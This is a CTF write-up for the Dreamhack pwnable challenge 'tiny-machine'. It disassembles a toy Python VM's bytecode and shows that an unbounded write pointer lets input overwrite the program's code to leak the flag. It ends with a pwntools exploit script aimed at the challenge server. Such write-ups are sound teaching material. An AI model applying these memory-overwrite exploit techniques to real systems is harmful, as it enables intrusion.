---
title: "Write Up for tiny-machine"
date: 2025-11-18 01:28:16 +0900
categories: [CTF, Dreamhack, Pwnable, Write up]
tags: []
---

# Write Up for tiny-machine
Source code is given as python code
```
import sys

class TinyMachine():
    def __init__(self, memory):
        self.memory = memory
        self.ip = 0
        self.registers = [0, 0, 0, 0]
        self.halted = False

    def setIp(self, ip):
        self.ip = ip

    def run(self):
        if self.halted:
            return

        while True:
            try:
                opcode = self.memory[self.ip]

                if opcode in [0, 1, 2, 3, 4, 5]:
                    dest = self.memory[self.ip + 1]
                    src = self.memory[self.ip + 2]                

                if opcode == 0: #LOAD
                    self.registers[dest] = self.memory[self.registers[src]]
                    self.ip += 3
                elif opcode == 1: #STORE
                    self.memory[self.registers[dest]] = self.registers[src]
                    self.ip += 3
                elif opcode == 2: #MOV_R_IMM
                    self.registers[dest] = src
                    self.ip += 3
                elif opcode == 3: #MOV_R_R
                    self.registers[dest] = self.registers[src]
                    self.ip += 3
                elif opcode == 4: #ADD_R_R
                    self.registers[dest] = (self.registers[dest] + self.registers[src]) & 0xFF
                    self.ip += 3
                elif opcode == 5: #ADD_R_IMM
                    self.registers[dest] = (self.registers[dest] + src) & 0xFF
                    self.ip += 3
                elif opcode == 6: #JNZ
                    if self.registers[1] != 0:
                        dest = self.memory[self.ip + 1]
                        self.ip = (self.ip + dest) & 0xFF
                    else:
                        self.ip += 2
                elif opcode == 7: #JMP
                    dest = self.memory[self.ip + 1]
                    self.ip = (self.ip + dest) & 0xFF
                elif opcode == 8: #EXT
                    if self.registers[0] == 0:
                        self.registers[1] = sys.stdin.buffer.read(1)[0]
                    elif self.registers[0] == 1:
                        sys.stdout.write(chr(self.registers[1]))
                        sys.stdout.flush()
                    self.ip += 1
                else:
                    self.halted = True
                    return
            except Exception as e:
                halted = True
                return

FLAG = b'DH{xxxxxxxxxxxxxxxxxxxxxxxxx}' #25

memory = list(FLAG + b'\xFF' * 192 + b'\x02\x02\x1d\x07\x02\x08\x01\x02\x01\x05\x02\x01\x05\x01\xf6\x06\xf4\x02\x00\x01\x02\x02\x1d\x00\x01\x02\x08\x05\x02\x01\x05\x01\xf6\x06\xf6')
machine = TinyMachine(memory)
machine.ip = 221
machine.run()
print("test")
```

**memory** is a list with a structure of
```
FLAG(29) + Padding(192) + bytecode(35)
```

# Primitives
At first, **memory** looks disorderd. But we can analyze this in perspective of assembly <br>

There are 0, 1, 2 operands for each opcode <br>

1. LOAD, STORE, MOV_R_IMM, MOV_R_R, ADD_R_R, ADD_R_IMM => 2 operands(src, dest)
2. JNZ, JMP => 1 operand(dest)
3. EXT => No operand(Perform read/write based on reg[1])

After 2-operands operation, self.ip increases by 3, and 1-operand increses 2. So, we can reconstruct byte code like below
```
IP: 221  \x02\x02\x1d   MOV   reg[2], 29     ; Store 29 in register 2 (address after FLAG)
IP: 224  \x07\x02       JMP   +2             ; Increase IP by 2 (set IP to 226)
IP: 226  \x08           EXT                  ; Receive input (reg[0]=0 mode)
IP: 227  \x01\x02\x01   STORE [reg[2]], reg[1] ; Store input value to memory[reg[2]]
IP: 230  \x05\x02\x01   ADD   reg[2], 1      ; Increase register 2 by 1 (move to next memory address)
IP: 233  \x05\x01\xf6   ADD   reg[1], -10    ; Add -10 to register 1 (counter)
IP: 236  \x06\xf4       JNZ   -12            ; If reg[1]≠0, jump to IP = 224 (JMP instruction)
IP: 238  \x02\x00\x01   MOV   reg[0], 1      ; Store 1 in register 0 (switch to output mode)
IP: 241  \x02\x02\x1d   MOV   reg[2], 29     ; Store 29 in register 2 (return to same memory area)
IP: 244  \x00\x01\x02   LOAD  reg[1], [reg[2]] ; Load value from memory[reg[2]] to reg[1]
IP: 247  \x08           EXT                  ; Output (reg[0]=1 means output mode)
IP: 248  \x05\x02\x01   ADD   reg[2], 1      ; Increase register 2 by 1 (next position)
IP: 251  \x05\x01\xf6   ADD   reg[1], -10    ; Add -10 to register 1 (counter)
IP: 254  \x06\xf6       JNZ   -10            ; If reg[1]≠0, jump to IP = 244 (LOAD instruction)
```

Now We can find that there are two loops in this byte code: read and write <br>

Intended operation (I assume) is reading and filling bytes of padding part and printing it <br>

But, since there is no limit of register 2 value, we can overwrite code part <br>

We can change IP:241 part to initialize register 2 to 0 -> Can print from FLAG <br>

Rewritten byte code can be look like this
```
IP: 221  \x02\x02\x1d   MOV   reg[2], 29     ; Store 29 in register 2 (address after FLAG)
IP: 224  \x07\x02       JMP   +2             ; Increase IP by 2 (set IP to 226)
IP: 226  \x08           EXT                  ; Receive input (reg[0]=0 mode)
IP: 227  \x01\x02\x01   STORE [reg[2]], reg[1] ; Store input value to memory[reg[2]]
IP: 230  \x05\x02\x01   ADD   reg[2], 1      ; Increase register 2 by 1 (move to next memory address)
IP: 233  \x05\x01\xf6   ADD   reg[1], -10    ; Add -10 to register 1 (counter)
IP: 236  \x06\xf4       JNZ   -12            ; If reg[1]≠0, jump to IP = 224 (JMP instruction)
IP: 238  \x02\x00\x01   MOV   reg[0], 1      ; Store 1 in register 0 (switch to output mode)
IP: 241  \x02\x02\x00   MOV   reg[2], 0     ; Store 0 in register 2 (start from flag) # Changed part
IP: 244  \x00\x01\x02   LOAD  reg[1], [reg[2]] ; Load value from memory[reg[2]] to reg[1]
IP: 247  \x08           EXT                  ; Output (reg[0]=1 means output mode)
IP: 248  \x05\x02\x01   ADD   reg[2], 1      ; Increase register 2 by 1 (next position)
IP: 251  \x06\xf3       JNZ   -7             ; If reg[1]≠0, jump to IP = 244 (LOAD instruction) # Changed part
```

# Exploit
Exploit code can be written like this <br>

Sending **\x00** is for IP:251 part, that is to finish the second loop. And sending **\n** is for finishing first loop 
```
from pwn import *

# p = process(['python3', 'tiny_machine.py'])
p = remote('host8.dreamhack.games',21257)

p.send(b'\x00')

for i in range(191):
    p.send(b'B')

program_malformed = b'\x02\x02\x1d\x07\x02\x08\x01\x02\x01\x05\x02\x01\x05\x01\xf6\x06\xf4\x02\x00\x01\x02\x02\x00\x00\x01\x02\x08\x05\x02\x01\x06\xf9'

for byte in program_malformed:
    p.send(bytes([byte]))

p.send(b'\n')

p.interactive()
```